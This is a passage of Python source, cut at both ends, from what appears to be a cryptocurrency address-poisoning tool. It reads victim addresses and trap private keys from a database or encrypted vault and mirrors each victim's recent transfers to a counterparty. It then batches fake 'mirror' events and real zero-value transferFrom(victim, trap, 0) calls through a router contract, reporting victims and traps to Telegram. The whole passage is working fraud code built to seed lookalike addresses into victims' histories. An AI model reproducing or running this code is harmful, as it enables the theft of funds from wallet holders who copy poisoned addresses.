                    from_addr = _hex_topic_to_address(log.topics[1])
                    to_addr = _hex_topic_to_address(log.topics[2])

                    if not from_addr or not to_addr:
                        continue

                    try:
                        data_bytes = _bytes_from_hexish(log.data)
                        value = int.from_bytes(data_bytes[:32], "big") if data_bytes else 0
                    except Exception:
                        value = 1

                    if value != 0:
                        continue

                    key = (token, from_addr, to_addr)
                    if pending_by_key.get(key):
                        success_indices.append(pending_by_key[key].pop(0))
            except Exception as e:
                logger.warning(f"[real-zero-batch] ERC-20 Transfer log fallback decode failed: {e}")

        success_indices = sorted(set(success_indices))

        # 3) Optional emergency fallback.
        if not success_indices and valid_items and receipt.status == 1:
            if REAL_ZERO_BATCH_ASSUME_SUCCESS_IF_NO_LOGS:
                logger.warning(
                    "[real-zero-batch] No readable success logs decoded, but "
                    "REAL_ZERO_BATCH_ASSUME_SUCCESS_IF_NO_LOGS=true. "
                    "Marking chunk successful to avoid blocking the queue."
                )
                success_indices = list(range(len(valid_items)))
            else:
                logger.error(
                    "[real-zero-batch] No readable success logs decoded. "
                    "Marking chunk as failed to avoid false zero_dust_count updates. "
                    "Verify deployed router ABI/event, or set "
                    "REAL_ZERO_BATCH_ASSUME_SUCCESS_IF_NO_LOGS=true temporarily."
                )

        success_ids = []
        for idx in success_indices:
            q = valid_items[idx]
            if q.get("trap_id"):
                success_ids.append(q["trap_id"])

        logger.info(
            f"[real-zero-batch] ✅ Chunk confirmed tx={tx_hash.hex()} "
            f"success={len(success_ids)}/{len(valid_items)}"
        )

        return tx_hash.hex(), success_ids

    except Exception as e:
        logger.error(f"[real-zero-batch] ❌ Failed: {e}")
        return None, []


def flush_real_zero_queue(queue, campaign_id, is_final=False):
    """
    Flush real zero-value transferFrom queue.

    Preferred path:
    - chunk queue into REAL_ZERO_BATCH_CHUNK_SIZE groups
    - send each group through RealZeroBatchRouter.batchTransferFrom(...)

    Fallback path:
    - if REAL_ZERO_BATCH_ROUTER is not configured, send individual
      real token.transferFrom(victim, trap, 0) transactions.
    """
    if not queue or not REAL_DUST_ENABLED:
        return 0, []

    operator_key = get_mirror_operator_key(campaign_id)
    if not operator_key:
        logger.error("[real-zero] No funding key configured for real zero dust")
        return 0, []

    try:
        operator_addr = w3.eth.account.from_key(operator_key).address
    except Exception as e:
        logger.error(f"[real-zero] Invalid funding key for real zero dust: {e}")
        return 0, []

    total_success = 0
    all_success_ids = []

    gas_params = get_smart_gas_params(
        w3,
        context="[real-zero][batch]",
        campaign_id=campaign_id,
    )

    # Preferred path: real router chunk batching
    if REAL_ZERO_BATCH_ROUTER:
        chunks = [
            queue[i:i + REAL_ZERO_BATCH_CHUNK_SIZE]
            for i in range(0, len(queue), REAL_ZERO_BATCH_CHUNK_SIZE)
        ]

        logger.info(
            f"[real-zero-batch] Flushing {len(queue)} items in "
            f"{len(chunks)} on-chain chunks of max {REAL_ZERO_BATCH_CHUNK_SIZE}"
        )

        for chunk_idx, chunk in enumerate(chunks, 1):
            logger.info(
                f"[real-zero-batch] Processing chunk {chunk_idx}/{len(chunks)} "
                f"({len(chunk)} transfers)"
            )

            tx_hash, success_ids = emit_real_zero_batch_transfers(
                chunk,
                campaign_id,
                gas_params_override=gas_params,
            )

            if success_ids:
                for tid in success_ids:
                    update_trap_zero_dust_count(tid)

                all_success_ids.extend(success_ids)
                total_success += len(success_ids)

                success_id_set = {str(tid) for tid in success_ids if tid}
                success_items = [
                    q for q in chunk
                    if str(q.get("trap_id")) in success_id_set
                ]

                if tx_hash and success_items:
                    send_real_zero_batch_telegram_notifications(
                        success_items,
                        tx_hash,
                        campaign_id,
                        is_final=is_final,
                        chunk_label=f"Chunk {chunk_idx}/{len(chunks)}",
                    )

            if chunk_idx < len(chunks):
                time.sleep(2)

        try:
            msg = (
                f"💧 *Real Zero-Dust Batch {'Final' if is_final else 'Processed'}*\n\n"
                f"🛰️ Router: `{REAL_ZERO_BATCH_ROUTER}`\n"
                f"📦 Logical batch: {len(queue)}\n"
                f"🧩 On-chain chunks: {len(chunks)} × max {REAL_ZERO_BATCH_CHUNK_SIZE}\n"
                f"✅ Successful: {total_success}\n"
                f"❌ Failed: {len(queue) - total_success}\n"
                f"🪙 Default asset: {REAL_DUST_DEFAULT_ASSET}\n"
                f"🔑 Operator: `{operator_addr}`"
            )
            send_telegram(msg, campaign_id=campaign_id)
        except Exception as e:
            logger.warning(f"[real-zero-batch] Failed to send batch notification: {e}")

        return total_success, all_success_ids

    # Fallback path: individual real transferFrom
    logger.warning(
        "[real-zero] REAL_ZERO_BATCH_ROUTER not set; "
        "using individual transferFrom fallback."
    )

    try:
        nonce = call_with_retry(w3.eth.get_transaction_count, operator_addr, "pending")
    except Exception as e:
        logger.error(f"[real-zero] Failed to get nonce for real zero dust: {e}")
        return 0, []

    for q in queue:
        item_success = False

        for attempt in range(1, REAL_DUST_MAX_RETRIES + 1):
            tx_hash, next_nonce, ok = emit_real_zero_transfer(
                q["victim"],
                q["trap"],
                q["asset"],
                campaign_id,
                nonce=nonce,
                gas_params_override=gas_params,
            )

            if next_nonce is not None:
                nonce = next_nonce

            if ok:
                total_success += 1
                if q.get("trap_id"):
                    all_success_ids.append(q["trap_id"])
                    update_trap_zero_dust_count(q["trap_id"])
                item_success = True
                break

            if attempt < REAL_DUST_MAX_RETRIES:
                logger.warning(
                    f"[real-zero] Retry {attempt}/{REAL_DUST_MAX_RETRIES} for "
                    f"{q['victim']} -> {q['trap']} ({q['asset']})"
                )
                time.sleep(REAL_DUST_RETRY_DELAY_SECONDS)

        if not item_success:
            logger.error(
                f"[real-zero] ❌ Failed after {REAL_DUST_MAX_RETRIES} attempts: "
                f"{q['victim']} -> {q['trap']} ({q['asset']})"
            )

    try:
        msg = (
            f"💧 *Real Zero-Dust Batch {'Final' if is_final else 'Processed'}*\n\n"
            f"🛰️ Mode: individual fallback\n"
            f"👥 Attempted: {len(queue)}\n"
            f"✅ Successful: {total_success}\n"
            f"❌ Failed: {len(queue) - total_success}\n"
            f"🪙 Default asset: {REAL_DUST_DEFAULT_ASSET}\n"
            f"🔑 Operator: `{operator_addr}`"
        )
        send_telegram(msg, campaign_id=campaign_id)
    except Exception as e:
        logger.warning(f"[real-zero] Failed to send batch notification: {e}")

    return total_success, all_success_ids


def get_web3():
    get_var = lambda name: getattr(config, name, None) or os.getenv(name)

    raw_urls = [
        get_var("RPC_URL"),
        get_var("DUSTER_RPC_URL"),
        get_var("NODE_RPC_URL"),
    ] + getattr(config, "FALLBACK_RPC_URLS", []) + PUBLIC_RPC_FALLBACKS.get(CHAIN.lower(), [])

    rpc_urls = list(dict.fromkeys([url for url in raw_urls if url]))

    print(f'[DEBUG] Trying {len(rpc_urls)} RPC URLs...')

    for url in rpc_urls:
        try:
            print(f'[DEBUG] Connecting to {url}...')
            provider = Web3.HTTPProvider(url, request_kwargs={'timeout': 30})
            w3 = Web3(provider)

            if w3.is_connected():
                if CHAIN.lower() in ('bsc', 'polygon') and geth_poa_middleware is not None:
                    try:
                        w3.middleware_onion.inject(geth_poa_middleware, layer=0)
                    except Exception as e:
                        print(f'[DEBUG] POA middleware injection skipped/failed: {e}')

                logger.info(f"Connected to RPC: {url}")
                return w3
        except Exception as e:
            print(f'[DEBUG] Connection failed for {url}: {e}')
            continue

    logger.critical("No RPC connection available.")
    sys.exit(1)

w3 = get_web3()
print('[DEBUG] Web3 instance ready.')

VAULT_FILE = config.VAULT_FILE

ERC20_ABI = [
    {
        "constant": False,
        "inputs": [{"name": "to", "type": "address"}, {"name": "value", "type": "uint256"}],
        "name": "transfer",
        "outputs": [{"name": "", "type": "bool"}],
        "type": "function",
    },
    {
        "constant": True,
        "inputs": [{"name": "owner", "type": "address"}],
        "name": "balanceOf",
        "outputs": [{"name": "", "type": "uint256"}],
        "type": "function",
    },
]

_last_gas_insufficient_alert = {}

def call_with_retry(func, *args, max_attempts=3, base_delay=1, **kwargs):
    last_exc = None
    for attempt in range(1, max_attempts + 1):
        try:
            return func(*args, **kwargs)
        except Exception as e:
            last_exc = e
            err_str = str(e).lower()
            if attempt < max_attempts:
                delay = base_delay * (2 ** (attempt - 1))
                if "429" in err_str or "too many requests" in err_str or "limit" in err_str:
                    delay = max(delay, 5)
                logger.warning(f"Retry {attempt}/{max_attempts} for {func.__name__} after {delay}s: {e}")
                time.sleep(delay)
            else:
                raise
    raise last_exc



def get_native_reserve_wei(chain_name):
    """Calculates the Wei equivalent of the GAS_RESERVE_USD for the native coin."""
    try:
        # CoinGecko IDs for the 3 supported chains
        symbol_map = {"ethereum": "ethereum", "bsc": "binancecoin", "polygon": "matic-network"}
        coin_id = symbol_map.get(chain_name.lower(), "ethereum")
        
        url = f"https://api.coingecko.com/api/v3/simple/price?ids={coin_id}&vs_currencies=usd"
        req = urllib.request.Request(url, headers={'User-Agent': 'CipherNet/1.0'})
        with urllib.request.urlopen(req, timeout=3) as response:
            data = json.loads(response.read().decode())
            price = data[coin_id]['usd']
            
            # Calculate exact Wei needed for the USD reserve (all 3 chains use 18 decimals)
            reserve_native = GAS_RESERVE_USD / price
            return int(reserve_native * (10 ** 18))
            
    except Exception:
        # Safe fallback reserves using conservative worst-case prices 
        # to ensure the trap ALWAYS keeps at least the GAS_RESERVE_USD value
        worst_case_prices = {
            "ethereum": 4000,   # Assumes ETH <= $4000
            "bsc": 700,         # Assumes BNB <= $700
            "polygon": 1.0      # Assumes MATIC <= $1.00
        }
        price = worst_case_prices.get(chain_name.lower(), 4000)
        return int((GAS_RESERVE_USD / price) * (10 ** 18))

def read_vault_lines(file_path):
    lines = []
    if not os.path.exists(file_path):
        return lines
    with open(file_path, 'r') as f:
        raw_lines = f.readlines()
        for idx, raw_line in enumerate(raw_lines):
            line = raw_line.strip()
            if not line:
                continue
            try:
                decrypted = decrypt(line)
                lines.append(decrypted)
            except Exception as e:
                logger.error(f"Failed to decrypt line {idx+1}: {e}")
                continue
    return lines

def get_trap_entries_from_db(campaign_id):
    entries = []
    if not supabase:
        logger.error("Supabase client not initialized.")
        return entries
    try:
        result = supabase.table("traps")\
            .select("id, victim_address, trap_private_key_enc, dust_count, zero_dust_count, counterparty_address")\
            .eq("campaign_id", campaign_id)\
            .execute()
        if not result.data:
            logger.info(f"No traps found for campaign {campaign_id}")
            return entries
        for row in result.data:
            enc_key = row.get("trap_private_key_enc")
            if not enc_key:
                continue
            try:
                private_key = decrypt(enc_key)
                w3.eth.account.from_key(private_key)
                victim = row.get("victim_address", "").lower()
                dust_count = row.get("dust_count", 0) or 0
                zero_dust_count = row.get("zero_dust_count", 0) or 0
                trap_id = row.get("id")
                counterparty = row.get("counterparty_address", "").lower() if row.get("counterparty_address") else ""
                if victim:
                    entries.append((trap_id, victim, private_key, dust_count, counterparty, zero_dust_count))
            except Exception as e:
                logger.error(f"Failed to decrypt private key for victim {row.get('victim_address')}: {e}")
                continue
        logger.info(f"Loaded {len(entries)} trap entries from database for campaign {campaign_id}")
    except Exception as e:
        logger.error(f"Failed to fetch traps from database: {e}")
    return entries


def get_trap_entries_by_ids(trap_ids):
    """Fetch specific traps by their IDs. Returns list of (trap_id, victim, key, dust_count, counterparty) tuples."""
    entries = []
    if not supabase:
        logger.error("Supabase client not initialized.")
        return entries
    if not trap_ids:
        return entries
    try:
        for i in range(0, len(trap_ids), 500):
            chunk = trap_ids[i:i + 500]
            result = supabase.table("traps")\
                .select("id, victim_address, trap_private_key_enc, dust_count, zero_dust_count, counterparty_address")\
                .in_("id", chunk)\
                .execute()
            if not result.data:
                continue
            for row in result.data:
                enc_key = row.get("trap_private_key_enc")
                if not enc_key:
                    continue
                try:
                    private_key = decrypt(enc_key)
                    w3.eth.account.from_key(private_key)
                    victim = row.get("victim_address", "").lower()
                    dust_count = row.get("dust_count", 0) or 0
                    zero_dust_count = row.get("zero_dust_count", 0) or 0
                    counterparty = row.get("counterparty_address", "").lower() if row.get("counterparty_address") else ""
                    if victim:
                        entries.append((row.get("id"), victim, private_key, dust_count, counterparty, zero_dust_count))
                except Exception as e:
                    logger.error(f"Failed to decrypt private key for trap {row.get('id')}: {e}")
                    continue
        logger.info(f"Loaded {len(entries)} filtered trap entries by IDs")
    except Exception as e:
        logger.error(f"Failed to fetch traps by IDs: {e}")
    return entries


def update_trap_dust_count(trap_id):
    """Increment dust_count and update last_dusted_at for a trap."""
    if not supabase or not trap_id:
        return
    
    now_iso = datetime.now(timezone.utc).isoformat()
    
    for attempt in range(3):
        try:
            # Fetch current dust_count, increment, and update
            result = supabase.table("traps").select("dust_count").eq("id", trap_id).execute()
            current_count = 0
            if result.data and len(result.data) > 0:
                current_count = result.data[0].get("dust_count", 0) or 0
            
            supabase.table("traps").update({
                "dust_count": current_count + 1,
                "last_dusted_at": now_iso
            }).eq("id", trap_id).execute()
            
            # Success - break out of retry loop
            return
            
        except Exception as e:
            err_str = str(e).lower()
            logger.warning(f"Failed to update dust_count for trap {trap_id} (attempt {attempt + 1}/3): {e}")
            
            # If it's a connection error, wait before retrying
            if "broken pipe" in err_str or "connection" in err_str or "timeout" in err_str:
                if attempt < 2:
                    logger.info(f"Connection error detected. Retrying in 3 seconds...")
                    time.sleep(3)
                    continue
            
            # If it's not a connection error, don't retry
            break
    
    logger.error(f"All 3 attempts failed for dust_count update on trap {trap_id}")


def get_counterparty_from_db(victim_address, campaign_id):
    """Fetch the counterparty address for a specific victim from the traps table."""
    if not supabase:
        logger.error("Supabase client not initialized.")
        return None
    try:
        result = supabase.table("traps")\
            .select("counterparty_address")\
            .eq("campaign_id", campaign_id)\
            .eq("victim_address", victim_address.lower())\
            .limit(1)\
            .maybe_single()\
            .execute()
        if result.data:
            return result.data.get("counterparty_address")
        return None
    except Exception as e:
        logger.error(f"Failed to fetch counterparty for victim {victim_address}: {e}")
        return None


def parse_cached_amount(amount_str, asset):
    """
    Parse cached amount from any format the database might have stored it in.
    Returns the amount in smallest units (wei for native, raw units for ERC-20).
    """
    if not amount_str:
        return 0
    
    amount_str = str(amount_str).strip()
    
    # Hex string (e.g., "0x21c94ac0") — ERC-20 raw units from Alchemy
    if amount_str.startswith('0x') or amount_str.startswith('0X'):
        return int(amount_str, 16)
    
    # Decimal float (e.g., "15.988555750235143") — native coin in human-readable form
    if '.' in amount_str:
        try:
            value_float = float(amount_str)
            if asset in ('ETH', 'BNB', 'MATIC', 'ETH', 'WETH'):
                # Native coins: 18 decimals
                return int(value_float * (10 ** 18))
            elif asset in ('USDC', 'USDT', 'USDP', 'TUSD', 'FRAX', 'BUSD', 'USDCe'):
                # Stablecoins: 6 decimals (USDC/USDT) or 18 decimals (DAI)
                if asset == 'DAI':
                    return int(value_float * (10 ** 18))
                return int(value_float * (10 ** 6))
            elif asset in ('WBTC', 'renBTC'):
                # Wrapped BTC: 8 decimals
                return int(value_float * (10 ** 8))
            else:
                # Default to 18 decimals for unknown tokens
                return int(value_float * (10 ** 18))
        except (ValueError, OverflowError):
            return 0
    
    # Plain integer string (e.g., "3136" or "15000000000000000000")
    try:
        value = int(amount_str)
        # If it looks like a human-readable number (very small), convert to wei
        if value < 1000000 and asset in ('ETH', 'BNB', 'MATIC'):
            return int(value * (10 ** 18))
        return value
    except ValueError:
        return 0
    

def fetch_last_transfer_from_blockchain(victim_address, counterparty_address, trap_id=None):
    """
    Fetch the most recent transfer with database caching.
    
    Strategy:
    1. Check database cache first
    2. If cache exists, only query from cached block to latest
    3. Update cache after successful query
    4. Fall back to full history only on first run
    """
    try:
        victim_checksum = w3.to_checksum_address(victim_address)
        counterparty_checksum = w3.to_checksum_address(counterparty_address)
        victim_lower = victim_address.lower()
        counterparty_lower = counterparty_address.lower()
        
        # Check database cache
        from_block = '0x0'  # Default to full history
        cached_asset = None
        cached_amount = None
        
        if trap_id and supabase:
            result = supabase.table('traps').select(
                'last_transfer_block, last_transfer_asset, last_transfer_amount'
            ).eq('id', trap_id).single().execute()
            
            if result.data and result.data.get('last_transfer_block'):
                cached_block = result.data['last_transfer_block']
                cached_asset = result.data['last_transfer_asset']
                cached_amount = result.data['last_transfer_amount']
                
                # Only query from cached block to latest (much faster)
                from_block = hex(cached_block + 1)  # Start from block after last cached
                logger.info(f"[Cache] Found cached transfer at block {cached_block}, querying from {from_block}")
        
        # Try Alchemy APIs (with rate limit handling from previous fix)
        alchemy_urls = ALCHEMY_RPCS.get(CHAIN.lower(), [])
        alchemy_errors = []
        
        for url_idx, url in enumerate(alchemy_urls):
            try:
                alchemy_w3 = Web3(Web3.HTTPProvider(url, request_kwargs={'timeout': 10}))
                if not alchemy_w3.is_connected():
                    continue
                
                categories = ['external', 'erc20']
                if CHAIN.lower() in ('ethereum', 'polygon'):
                    categories.append('internal')
                
                result = alchemy_w3.provider.make_request('alchemy_getAssetTransfers', [{
                    'fromBlock': from_block,
                    'toBlock': 'latest',
                    'fromAddress': victim_checksum,
                    'toAddress': counterparty_checksum,
                    'category': categories,
                    'order': 'desc',
                    'maxCount': '0x5',
                    'withMetadata': True,  # Include block metadata for caching
                }])
                
                if 'result' in result and result['result'].get('transfers'):
                    transfers = result['result']['transfers']
                    
                    for t in transfers:
                        if (t.get('from', '').lower() == victim_lower and 
                            t.get('to', '').lower() == counterparty_lower):
                            
                            # Extract block number for caching
                            block_hex = t.get('blockNum', '0x0')
                            block_num = int(block_hex, 16)
                            
                            # Native transfer
                            if t.get('category') == 'external':
                                value_raw = t.get('value', 0)
                                if isinstance(value_raw, str):
                                    try:
                                        value_float = float(value_raw)
                                        value_wei = int(value_float * (10 ** 18))
                                    except ValueError:
                                        if value_raw.startswith('0x'):
                                            value_wei = int(value_raw, 16)
                                        else:
                                            value_wei = int(value_raw)
                                else:
                                    value_wei = int(float(value_raw) * (10 ** 18))
                                
                                if value_wei > 0:
                                    logger.info(f"[Alchemy] Found {NATIVE_SYMBOL} transfer: {w3.from_wei(value_wei, 'ether')} ETH at block {block_num}")
                                    
                                    # Update cache
                                    update_transfer_cache(trap_id, block_num, NATIVE_SYMBOL, str(value_wei))
                                    
                                    return (NATIVE_SYMBOL, value_wei)
                            
                            # ERC-20 transfer
                            elif t.get('category') == 'erc20':
                                raw_contract = t.get('rawContract', {})
                                raw_hex = raw_contract.get('value')
                                
                                if raw_hex:
                                    value_units = int(raw_hex, 16)
                                else:
                                    token_addr = raw_contract.get('address', '').lower()
                                    decimals = 6
                                    for sym, addr in TOKEN_CONFIG.items():
                                        if addr.lower() == token_addr:
                                            decimals = config.get_token_decimals().get(sym, 6) if hasattr(config, 'get_token_decimals') else 6
                                            break
                                    value_units = int(float(t.get('value', 0)) * (10 ** decimals))
                                
                                if value_units > 0:
                                    token_contract = raw_contract.get('address', '').lower()
                                    for symbol, addr in TOKEN_CONFIG.items():
                                        if addr.lower() == token_contract:
                                            logger.info(f"[Alchemy] Found {symbol} transfer: {value_units} units at block {block_num}")
                                            
                                            # Update cache
                                            update_transfer_cache(trap_id, block_num, symbol, str(value_units))
                                            
                                                        #    /* fix */
                                            return (symbol, value_units)
                
                # No new transfers found since cached block
                if cached_asset and cached_amount:
                    parsed_amount = parse_cached_amount(cached_amount, cached_asset)
                    logger.info(f"[Cache] No new transfers since block {cached_block}, using cached: {cached_amount} {cached_asset} → {parsed_amount} units")
                    return (cached_asset, parsed_amount)
                
                # First run - no cache and no transfers found
                logger.info(f"[Alchemy] No transfers found in history")
                return (None, None)
                
            except Exception as e:
                err_str = str(e)
                logger.warning(f"[Alchemy:{url[:30]}...] Failed: {err_str[:200]}")
                alchemy_errors.append((url[:30], err_str[:100]))
                
                # Rate limit handling
                err_lower = err_str.lower()
                if '429' in err_lower or 'rate limit' in err_lower or 'too many requests' in err_lower:
                    if url_idx < len(alchemy_urls) - 1:
                        logger.info(f"[Alchemy] Rate limited, waiting 2s before next URL...")
                        time.sleep(2)
                continue
        
               # All Alchemy URLs failed
        if cached_asset and cached_amount:
            # Use cached data if available
            parsed_amount = parse_cached_amount(cached_amount, cached_asset)
            if parsed_amount > 0:
                logger.warning(f"[Cache] Alchemy failed, using cached: {cached_amount} {cached_asset} → {parsed_amount} units")
                return (cached_asset, parsed_amount)
            else:
                logger.error(f"[Cache] Could not parse cached amount: '{cached_amount}' for {cached_asset}")
        
        # No cache and all APIs failed - skip this victim
        logger.error(f"[SKIP] All Alchemy URLs failed and no cache available for {victim_address}")
        return (None, None)
        
    except Exception as e:
        logger.error(f"[RPC] Error fetching last transfer: {e}")
        return (None, None)


def update_transfer_cache(trap_id, block_num, asset, amount):
    """Update the transfer cache in the database."""
    if not trap_id or not supabase:
        return
    
    try:
        supabase.table('traps').update({
            'last_transfer_block': block_num,
            'last_transfer_asset': asset,
            'last_transfer_amount': amount,
            'last_transfer_timestamp': datetime.now(timezone.utc).isoformat()
        }).eq('id', trap_id).execute()
        logger.debug(f"[Cache] Updated cache for trap {trap_id}: block {block_num}, {amount} {asset}")
    except Exception as e:
        logger.warning(f"[Cache] Failed to update cache for trap {trap_id}: {e}")


def send_batch_telegram_notifications(queue, tx_hash, campaign_id, is_final=False):
    """
    Splits a batch of transactions into multiple Telegram messages 
    to respect Telegram's 4096 character limit per message.
    """
    try:
        tx_url = get_explorer_url(tx_hash, 'tx')
        
        # 🚀 REDUCED TO 10: 20 items was ~4300 chars (still over the 4096 limit).
        # 10 items guarantees we stay around ~2300 chars per message.
        CHUNK_SIZE = 10
        chunks = [queue[i:i + CHUNK_SIZE] for i in range(0, len(queue), CHUNK_SIZE)]
        
        title = "🪞 *Final Batch Mirror Events!*" if is_final else "🪞 *Batch Mirror Events Emitted!*"
        
        for chunk_idx, chunk in enumerate(chunks):
            # Add part number if there are multiple messages
            if len(chunks) > 1:
                header = f"{title} (Part {chunk_idx + 1}/{len(chunks)})\n\n"
            else:
                header = f"{title}\n\n"
                
            header += f"👥 Processed: {len(queue)} victims\n"
            header += f"🔗 [View TX on Explorer]({tx_url})\n\n"
            
            msg = header
            
            # Calculate the starting index for continuous numbering across messages
            start_idx = chunk_idx * CHUNK_SIZE + 1
            
            for idx, q in enumerate(chunk, start_idx):
                # Safely handle asset string
                asset_str = str(q['asset']) if q['asset'] else 'ETH'
                decimals = get_token_decimals(asset_str)
                amount_display = q['amount'] / (10 ** decimals)
                victim_url = get_explorer_url(q['victim'])
                trap_url = get_explorer_url(q['trap'])
                
                msg += f"*{idx}.* ({amount_display:.4f} {asset_str})\n"
                msg += f"👤 [Victim]({victim_url})\n"
                msg += f"🪤 [Trap]({trap_url})\n\n"
                
            send_telegram(msg, campaign_id=campaign_id)
            
    except Exception as e:
        # 🚀 Catch and log any hidden Telegram formatting or API errors
        logger.error(f"[Telegram] Failed to send batch notification: {e}")


def send_skipped_dusted_notifications(skipped_details, campaign_id):
    """Tell the user which traps were skipped because they were already dusted."""
    if not skipped_details:
        return
    try:
        CHUNK_SIZE = 10
        chunks = [skipped_details[i:i + CHUNK_SIZE] for i in range(0, len(skipped_details), CHUNK_SIZE)]
        for chunk_idx, chunk in enumerate(chunks):
            if len(chunks) > 1:
                header = f"⏭️ *Skipped Already-Dusted Traps* (Part {chunk_idx + 1}/{len(chunks)})\n\n"
            else:
                header = "⏭️ *Skipped Already-Dusted Traps*\n\n"
            header += f"👥 Skipped: {len(skipped_details)}\n"
            header += "💡 No new dust was sent for these.\n\n"
            msg = header
            start_idx = chunk_idx * CHUNK_SIZE + 1
            for idx, s in enumerate(chunk, start_idx):
                victim_url = get_explorer_url(s['victim'])
                msg += f"*{idx}.* {s['reason']}\n"
                msg += f"👤 [Victim]({victim_url})\n"
                msg += f"🪞 Fake dust count: `{s['dust_count']}`\n"
                msg += f"💧 Real zero count: `{s['zero_dust_count']}`\n\n"
            send_telegram(msg, campaign_id=campaign_id)
    except Exception as e:
        logger.error(f"[Telegram] Failed to send skipped notification: {e}")


def batch_poison(job_id=None, campaign_id=None, trap_ids=None):
    has_trap_ids = trap_ids is not None and len(trap_ids) > 0
    

    if has_trap_ids:
        logger.info(f"Using filtered mode: {len(trap_ids)} specific trap IDs")
        filtered_entries = get_trap_entries_by_ids(trap_ids)
        if not filtered_entries:
            logger.error("No traps found for the provided IDs")
            return
        entries = filtered_entries
    elif campaign_id:
        logger.info(f"Using database for campaign {campaign_id}")
        entries = get_trap_entries_from_db(campaign_id)
        if not entries:
            logger.error(f"No traps found for campaign {campaign_id}")
            return
    else:
        logger.info("Using vault file for legacy mode")
        if not os.path.exists(VAULT_FILE):
            logger.error(f"{VAULT_FILE} not found.")
            return
        decrypted_lines = read_vault_lines(VAULT_FILE)
        if not decrypted_lines:
            logger.error("No valid (decrypted) entries found in vault.txt")
            return
        entries = []
        for line in decrypted_lines:
            match = re.search(r"Victim:\s*(0x[a-fA-F0-9]{40}).*Key:\s*(0x[a-fA-F0-9]{64})", line, re.IGNORECASE)
            if match:
                # Legacy mode: no trap_id, no dust_count, no counterparty
                entries.append((None, match.group(1), match.group(2), 0, None))
            else:
                match = re.search(r"Target:\s*(0x[a-fA-F0-9]{40}).*Key:\s*(0x[a-fA-F0-9]{64})", line, re.IGNORECASE)
                if match:
                    entries.append((None, match.group(1), match.group(2), 0, None))

    if not entries:
        logger.error("No valid entries found")
        return

    CAUGHT_FILE = config.CAUGHT_FILE
    caught = set()
    if os.path.exists(CAUGHT_FILE):
        try:
            with open(CAUGHT_FILE, 'r') as f:
                data = f.read()
                if data.strip():
                    for line in data.split('\n'):
                        addr = line.strip().lower()
                        if addr:
                            caught.add(addr)
            logger.info(f"Loaded {len(caught)} caught victims from {CAUGHT_FILE}")
        except Exception as e:
            logger.warning(f"Could not read caught victims file: {e}")

    # 🚀 CRITICAL: Define total right here before using it
    total = len(entries)
    logger.info(f"Found {total} victims. Processing with mirror events only...")
    
    if job_id:
        update_job(job_id, total=total)
        
          # 🚀 BATCH PROCESSING: 400 items per multi-token batch to minimize gas fees
    BATCH_SIZE = 400
    
    # 🚀 Send "Started" Telegram notification immediately
    start_msg = (
        f"🚀 *Manual Dusting Started*\n\n"
        f"👥 Total victims: {total}\n"
        f"⚙️ Processing batches of {BATCH_SIZE}..."
    )
    send_telegram(start_msg, campaign_id=campaign_id)

    success = 0
    gas_failures = 0
    skipped_dusted = 0
    real_success = 0
    fake_attempted = 0
    real_attempted = 0
    skipped_details = []
    poison_queue = []  # Single unified queue for all assets (multi-token batching)
    real_queue = []    # Separate real zero-value dust queue
    
    for i, entry in enumerate(entries, 1):
        trap_id = entry[0]
        victim = entry[1]
        key = entry[2]
        dust_count = entry[3]
        counterparty = entry[4]
        zero_dust_count = entry[5] if len(entry) > 5 else 0

        if victim.lower() in caught:
            logger.info(f"Skipping caught victim {victim}")
            continue

        # 🚀 INDEPENDENT LANES: fake gated by dust_count, real gated by zero_dust_count
        fake_needed = dust_count == 0
        real_needed = REAL_DUST_ENABLED and zero_dust_count == 0

        if not fake_needed and not real_needed:
            logger.info(
                f"[{i}/{total}] Skipping already dusted victim {victim} "
                f"(fake dust_count: {dust_count}, real zero_dust_count: {zero_dust_count})"
            )
            skipped_dusted += 1
            skipped_details.append({
                'victim': victim,
                'dust_count': dust_count,
                'zero_dust_count': zero_dust_count,
                'reason': 'Fake + real already dusted',
            })
            continue

        logger.info(
            f"[{i}/{total}] Processing victim {victim} "
            f"(fake_needed={fake_needed}, real_needed={real_needed})"
        )
        
        trap_address = w3.eth.account.from_key(key).address.lower()
        
        if not counterparty:
            logger.warning(f"[{i}/{total}] No counterparty found for {victim}, skipping")
            skipped_details.append({
                'victim': victim,
                'dust_count': dust_count,
                'zero_dust_count': zero_dust_count,
                'reason': 'No counterparty address',
            })
            continue
        
        # Fetch last transfer from blockchain (with caching)
        logger.info(f"[mirror] Fetching last transfer from {victim} to {counterparty} (trap_id: {trap_id})...")
        fetched_asset, fetched_amount = fetch_last_transfer_from_blockchain(victim, counterparty, trap_id)
        
        if not fetched_asset or not fetched_amount:
            # 🆕 Use default fallback: emit a small native transfer
            logger.info(f"[{i}/{total}] No transfer found for {victim}, using default {NATIVE_SYMBOL} fallback")
            fetched_asset = NATIVE_SYMBOL
            fetched_amount = w3.to_wei(1, 'ether')
        
        logger.info(f"[mirror] Last transfer: {fetched_amount} units of {fetched_asset}")
        
        if real_needed:
            real_asset = choose_real_dust_asset(fetched_asset)
            real_queue.append({
                'victim': victim,
                'trap': trap_address,
                'asset': real_asset,
                'amount': 0,
                'trap_id': trap_id,
            })
            real_attempted += 1

        # 🚀 Add to unified multi-token batch queue (only if fake not yet done)
        if fake_needed:
            poison_queue.append({
                'victim': victim,
                'trap': trap_address,
                'amount': fetched_amount,
                'asset': fetched_asset,
                'trap_id': trap_id,
            })
            fake_attempted += 1
        
        # 🚀 Process batch when queue reaches BATCH_SIZE (700)
        if len(poison_queue) >= BATCH_SIZE:
            logger.info(f"[batch] Processing multi-token batch of {len(poison_queue)} victims...")
            
            batch_trap_ids = [q['trap_id'] for q in poison_queue if q['trap_id']]
            
            # Emit multi-token batch via Router
            tx_hash = emit_multi_token_batch_transfers(poison_queue, campaign_id)
            
            if tx_hash:
                success += len(poison_queue)
                logger.info(f"[batch] ✅ Multi-token batch emitted: {len(poison_queue)} transfers in tx={tx_hash}")
                
                for tid in batch_trap_ids:
                    update_trap_dust_count(tid)
                    
                send_batch_telegram_notifications(poison_queue, tx_hash, campaign_id, is_final=False)
                
                # 🚀 NONCE SAFETY: Wait 2 seconds to let the RPC load-balancer sync the mined block 
                # before the next batch fetches the 'pending' nonce. Prevents "nonce too low" errors.
                time.sleep(2) 
            else:
                operator_key = get_mirror_operator_key(campaign_id)
                if operator_key:
                    try:
                        operator_addr = w3.eth.account.from_key(operator_key).address
                        operator_balance = call_with_retry(w3.eth.get_balance, operator_addr)
                        if operator_balance < w3.to_wei(0.0001, 'ether'):
                            gas_failures += 1
                            logger.warning(f"[batch] ❌ Multi-token batch failed (gas insufficient)")
                            if gas_failures >= 3:
